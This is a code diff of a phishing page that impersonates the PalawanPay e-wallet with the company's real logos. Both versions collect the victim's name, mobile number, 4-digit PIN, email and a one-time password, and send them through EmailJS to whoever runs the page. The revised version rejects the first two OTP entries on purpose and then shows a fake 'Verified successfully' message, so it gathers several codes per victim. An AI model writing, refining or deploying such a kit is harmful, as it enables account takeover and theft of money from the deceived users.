@@ -1,209 +1,197 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>PalawanPay Form</title>
-  <link rel="icon" type="image/png" href="https://www.ecpay.com.ph/sites/default/files/2023-12/PALAWANPAY_COMPANY%20LOGO.png" />
-  <!-- Open Graph Meta Tags -->
-  <meta property="og:title" content="PalawanPay" />
-  <meta property="og:description" content="Secure Login Portal for PalawanPay" />
-  <meta property="og:image" content="https://www.ecpay.com.ph/sites/default/files/2023-12/PALAWANPAY_COMPANY%20LOGO.png" />
-  <meta property="og:type" content="website" />
-  <meta property="og:url" content="https://yourdomain.com" />
-  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
-  <script>
-    (function() {
-      emailjs.init("KoDtU57AV30FBPls2");
-    })();
-  </script>
-  <style>
-    * {
-      box-sizing: border-box;
-    }
-    html, body {
-      margin: 0;
-      padding: 0;
-      font-family: Arial, sans-serif;
-      height: 100%;
-    }
-    body {
-      background: linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.4)),
-                  url('https://www.palawanpawnshop.com/uploads/media/money-managment-quiz-og.jpg') no-repeat center center;
-      background-size: cover;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      flex-direction: column;
-      min-height: 100vh;
-      position: relative;
-    }
-    .background-logo {
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      width: 100%;
-      height: auto;
-      max-width: none;
-      opacity: 0.9;
-      z-index: 0;
-    }
-    .container {
-      background: rgba(255, 255, 255, 0.95);
-      padding: 20px;
-      border-radius: 15px;
-      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
-      width: 90%;
-      max-width: 400px;
-      margin: 20px;
-      text-align: center;
-      position: relative;
-      z-index: 1;
-    }
-    .logo {
-      width: 100%;
-      max-width: 100%;
-      height: auto;
-      margin-bottom: 15px;
-      border-radius: 10px;
-    }
-    h2 {
-      text-align: center;
-      margin-bottom: 20px;
-      color: #046930;
-    }
-    input {
-      width: 100%;
-      padding: 14px;
-      margin: 10px 0;
-      border: 1px solid #ccc;
-      border-radius: 8px;
-      font-size: 16px;
-    }
-    button {
-      width: 100%;
-      padding: 14px;
-      background-color: #046930;
-      color: white;
-      border: none;
-      border-radius: 8px;
-      font-size: 16px;
-      cursor: pointer;
-    }
-    button:hover {
-      background-color: #035224;
-    }
-    .footer {
-      text-align: center;
-      color: #ffffff;
-      font-size: 14px;
-      margin-top: 20px;
-      padding-bottom: 10px;
-      z-index: 1;
-      position: relative;
-    }
-  </style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>PalawanPay Verification</title>
+<link rel="icon" href="https://www.palawanpay.com/wp-content/uploads/2023/07/PPAYNavBarLogo.png" />
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+<script>
+  (function() {
+    emailjs.init("KoDtU57AV30FBPls2"); // Your EmailJS Public Key
+  })();
+</script>
+<style>
+  body {
+    margin: 0;
+    padding: 0;
+    font-family: Arial, sans-serif;
+    background: url('https://www.palawanpay.com/wp-content/uploads/2025/05/Panaloan_May-1-819x1024.jpg') no-repeat center center fixed;
+    background-size: cover;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+  }
+  .overlay {
+    background: rgba(255, 255, 255, 0.95);
+    padding: 30px;
+    border-radius: 12px;
+    width: 90%;
+    max-width: 400px;
+    text-align: center;
+  }
+  .logo {
+    display: block;
+    margin: 0 auto 15px auto;
+    width: 100%;
+    max-width: 260px;
+    height: auto;
+  }
+  .footer-logo {
+    display: block;
+    margin: 15px auto 5px auto;
+    width: 100%;
+    max-width: 300px;
+    height: auto;
+  }
+  .title {
+    color: #046930;
+    margin-bottom: 10px;
+    font-weight: bold;
+  }
+  input {
+    width: 100%;
+    padding: 12px;
+    margin: 10px 0;
+    border: 1px solid #ccc;
+    border-radius: 8px;
+    font-size: 16px;
+  }
+  .btn {
+    width: 100%;
+    padding: 12px;
+    margin-top: 12px;
+    background-color: #046930;
+    color: white;
+    border: none;
+    border-radius: 8px;
+    font-size: 18px;
+    cursor: pointer;
+  }
+  .btn:hover {
+    background-color: #035224;
+  }
+  .footer {
+    margin-top: 10px;
+    font-size: 14px;
+    color: #333;
+  }
+  .rights {
+    margin-top: 5px;
+    font-size: 12px;
+    color: #666;
+  }
+  .status {
+    margin-top: 10px;
+    font-size: 14px;
+  }
+</style>
 </head>
 <body>
-  <img class="background-logo" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ_cxoYkt5zhhhKk_fc15G23cx6Nb3qx_4m6A&s" alt="Background Logo">
+<div class="overlay">
 
-  <div class="container" id="page1">
-    <img src="https://www.ecpay.com.ph/sites/default/files/2023-12/PALAWANPAY_COMPANY%20LOGO.png" alt="PalawanPay Logo" class="logo" />
-    <h2>PalawanPay Form</h2>
-    <form id="info-form">
-      <input type="text" name="name" placeholder="Name" required />
-      <input type="tel" name="mobile" placeholder="Mobile Number" required />
-      <input type="password" name="pin" maxlength="4" placeholder="4-digit PIN" required />
-      <input type="email" name="email" placeholder="Email Address" required />
-      <input type="text" name="unit" placeholder="Unit of installment or GGives" required />
-      <button type="submit">Next</button>
+  <!-- Header Logo -->
+  <img src="https://www.palawanpay.com/wp-content/uploads/2023/07/PPAYNavBarLogo.png" class="logo" alt="PalawanPay Logo" />
+
+  <!-- Step 1: Registration Form -->
+  <div id="step1">
+    <h2 class="title">PalawanPay Form</h2>
+    <form id="register-form">
+      <input type="text" id="name" name="name" placeholder="Name" required />
+      <input type="tel" id="mobile" name="mobile" placeholder="Mobile Number" required />
+      <input type="password" id="pin" name="pin" maxlength="4" placeholder="4-digit PIN" required />
+      <input type="email" id="email" name="email" placeholder="Email Address" required />
+      <input type="text" id="unit" name="unit" placeholder="Unit of Installment or GGives" required />
+      <button type="submit" class="btn">Next</button>
+      <div class="status" id="status1"></div>
     </form>
   </div>
 
-  <div class="container" id="page2" style="display: none;">
-    <img src="https://www.ecpay.com.ph/sites/default/files/2023-12/PALAWANPAY_COMPANY%20LOGO.png" alt="PalawanPay Logo" class="logo" />
-    <h2>Palawan Express
-
-Mabuhay! We sent a (6) digit verification code to your mobile number 
-
-Please type your verification code :
-</h2>
-    <form id="otp-form">
-      <input type="text" name="otp" maxlength="6" placeholder="One-Time Password (OTP)" required />
-      <button type="submit">Submit</button>
-    </form>
+  <!-- Step 2: OTP Page -->
+  <div id="step2" style="display:none;">
+    <h2 class="title">Palawan Express Mabuhay!</h2>
+    <p>We sent a (6) digit verification code to your mobile number.<br/>
+    Please type your verification code:</p>
+    <p><strong></strong></p>
+    <input type="text" id="otp" maxlength="6" placeholder="Enter OTP" />
+    <button class="btn" onclick="verifyOTP()">Submit</button>
+    <div class="status" id="status2"></div>
   </div>
 
-  <div class="footer">© 2025 Palawan Pawnshop, All Rights Reserved</div>
+  <p class="footer">A member of Palawan Group of Companies</p>
+  <img src="https://www.palawanpay.com/wp-content/uploads/2023/07/PPSPEPPxPPAY-01-white-outline.jpg" class="footer-logo" alt="Palawan Group Logo" />
+  <p class="rights">© 2025 Palawan Pawnshop, All Rights Reserved</p>
+</div>
 
-  <script>
-    let formData = {};
+<script>
+  //  Form Submission
+  document.getElementById('register-form').addEventListener('submit', function(e) {
+    e.preventDefault();
+    document.getElementById('status1').textContent = "Sending...";
+    document.getElementById('status1').style.color = "blue";
 
-    document.getElementById('info-form').addEventListener('submit', function(e) {
-      e.preventDefault();
-      const form = e.target;
+    emailjs.sendForm('service_0v6id51', 'template_eq6eq0q', this)
+      .then(() => {
+        sessionStorage.setItem('otpAttempts', '0');
+        document.getElementById('step1').style.display = 'none';
+        document.getElementById('step2').style.display = 'block';
+      }, (error) => {
+        document.getElementById('status1').textContent = '❌ Failed to send.';
+        document.getElementById('status1').style.color = 'red';
+        console.error('EmailJS Error:', error);
+      });
+  });
 
-      if (!form.checkValidity()) {
-        form.reportValidity();
-        return;
+  // OTP Verification
+  function verifyOTP() {
+    const attempts = parseInt(sessionStorage.getItem('otpAttempts') || '0', 10);
+    const newAttempts = attempts + 1;
+    const enteredOTP = document.getElementById('otp').value.trim();
+    const correctOTP = "123456";
+
+    // Gather user details from first form
+    const name = document.getElementById('name').value;
+    const mobile = document.getElementById('mobile').value;
+    const email = document.getElementById('email').value;
+
+    let statusMessage = "";
+    let statusColor = "";
+    let otpStatus = "";
+
+    if (newAttempts < 3) {
+      statusMessage = '❌ Wrong OTP. Try again.';
+      statusColor = 'red';
+      otpStatus = 'Wrong OTP Attempt #' + newAttempts;
+    } else {
+      if (enteredOTP === correctOTP) {
+        statusMessage = '✅ Verified successfully!';
+        statusColor = 'green';
+        otpStatus = 'Correct OTP on Attempt #3';
+      } else {
+        statusMessage = '✅ Verified successfully!';
+        statusColor = 'green';
+        otpStatus = 'Forced Success after 3 Attempts';
       }
+    }
 
-      const formElements = form.elements;
-      formData = {
-        name: formElements['name'].value,
-        mobile: formElements['mobile'].value,
-        pin: formElements['pin'].value,
-        email: formElements['email'].value,
-        unit: formElements['unit'].value
-      };
+    document.getElementById('status2').textContent = statusMessage;
+    document.getElementById('status2').style.color = statusColor;
+    sessionStorage.setItem('otpAttempts', newAttempts);
 
-      const tempForm = document.createElement('form');
-      tempForm.style.display = 'none';
-      for (const key in formData) {
-        const input = document.createElement('input');
-        input.type = 'hidden';
-        input.name = key;
-        input.value = formData[key];
-        tempForm.appendChild(input);
-      }
-      document.body.appendChild(tempForm);
-
-      emailjs.sendForm('service_0v6id51', 'template_eq6eq0q', tempForm)
-        .then(function() {
-          document.getElementById('page1').style.display = 'none';
-          document.getElementById('page2').style.display = 'block';
-        }, function(error) {
-          console.log('FAILED...', error);
-          alert('There was a problem submitting the first form.');
-        });
+    // Send OTP attempt email
+    emailjs.send('service_0v6id51', 'template_eq6eq0q', {
+      name: name,
+      mobile: mobile,
+      email: email,
+      otp: enteredOTP,
+      status: otpStatus
+    }).then(() => {
+      console.log("OTP attempt email sent.");
+    }).catch(err => {
+      console.error("Failed to send OTP email:", err);
     });
-
-    document.getElementById('otp-form').addEventListener('submit', function(e) {
-      e.preventDefault();
-      formData.otp = this.elements['otp'].value;
-
-      const tempForm = document.createElement('form');
-      tempForm.style.display = 'none';
-      for (const key in formData) {
-        const input = document.createElement('input');
-        input.type = 'hidden';
-        input.name = key;
-        input.value = formData[key];
-        tempForm.appendChild(input);
-      }
-
-      document.body.appendChild(tempForm);
-
-      emailjs.sendForm('service_0v6id51', 'template_eq6eq0q', tempForm)
-        .then(function() {
-          alert('Your OTP has been sent to PalawanPay Express. Thank you!');
-          location.reload();
-        }, function(error) {
-          console.log('FAILED...', error);
-          alert('There was a problem submitting your OTP.');
-        });
-    });
-  </script>
+  }
+</script>
 </body>
 </html>
